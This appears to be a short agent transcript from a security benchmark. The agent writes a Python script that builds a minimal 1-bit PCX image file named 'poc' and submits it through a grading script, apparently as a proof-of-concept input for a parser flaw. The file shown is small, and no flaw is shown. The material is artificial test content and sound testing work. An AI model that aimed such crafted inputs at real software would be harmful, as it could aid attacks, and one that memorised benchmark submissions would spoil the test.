Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('poc')
# PCX header for 1-bit monochrome, width=8 height=1, BytesPerLine=1, compressed
hdr=bytearray(128)
hdr[0]=10; hdr[1]=5; hdr[2]=1; hdr[3]=1
# XMin/YMin=0, XMax/YMax=7/0 little endian
hdr[8:10]=(0).to_bytes(2,'little')
hdr[10:12]=(0).to_bytes(2,'little')
hdr[12:14]=(7).to_bytes(2,'little')
hdr[14:16]=(0).to_bytes(2,'little')
# HDpi/YDpi
hdr[16:18]=(72).to_bytes(2,'little')
hdr[18:20]=(72).to_bytes(2,'little')
# 16-color palette zeros already
hdr[64]=0
hdr[65]=1
hdr[66:68]=(1).to_bytes(2,'little')
hdr[68:70]=(1).to_bytes(2,'little')
# rest zero
# image data: one byte 0xFF
p.write_bytes(hdr + b'\xff')
print('wrote', p, len(hdr)+1)
PY
bash submit.sh /workspace/poc /workspace/analysis.json
